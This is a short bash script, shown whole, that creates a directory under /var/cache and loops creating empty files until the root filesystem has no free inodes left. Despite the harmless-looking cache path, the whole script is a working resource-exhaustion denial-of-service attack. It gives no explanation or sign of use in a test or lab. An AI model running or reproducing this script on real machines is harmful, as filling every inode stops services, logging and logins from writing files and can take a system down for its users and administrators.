#!/bin/bash
mkdir -p /var/cache/application
cd /var/cache/application
while [ $(df --output=iavail / | tail -n1) -gt 0 ]; do
  touch $((i++)); 
done
exit 0
